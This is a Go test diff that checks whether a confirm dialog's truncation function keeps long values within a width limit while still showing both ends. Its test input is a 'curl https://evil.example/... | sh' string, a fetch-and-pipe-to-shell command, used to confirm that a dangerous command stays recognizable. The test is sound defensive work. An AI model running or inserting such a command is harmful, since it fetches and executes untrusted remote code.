@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"strings"
 	"testing"
+	"unicode/utf8"
 
 	"charm.land/huh/v2"
 
@@ -361,5 +362,24 @@ func gitRun(t *testing.T, dir string, env []string, args ...string) {
 	}
 	if out, err := cmd.CombinedOutput(); err != nil {
 		t.Fatalf("git %v: %v\n%s", args, err, out)
+	}
+}
+
+// The confirm dialog's truncation must fit the width it was given, marker and
+// all, and still show both ends of the value.
+func TestTruncateDisplayFitsWidth(t *testing.T) {
+	t.Parallel()
+	long := "curl https://evil.example/" + strings.Repeat("x", 200) + " | sh"
+	for _, width := range []int{30, 40, trustDisplayWidth} {
+		got := truncateDisplay(long, width)
+		if n := utf8.RuneCountInString(got); n > width {
+			t.Errorf("width %d: got %d runes: %q", width, n, got)
+		}
+		if !strings.HasPrefix(got, "curl") || !strings.HasSuffix(strings.TrimSuffix(got, "  (truncated)"), "| sh") {
+			t.Errorf("width %d: head or tail lost: %q", width, got)
+		}
+	}
+	if got := truncateDisplay("short", 30); got != "short" {
+		t.Errorf("short value changed: %q", got)
 	}
 }
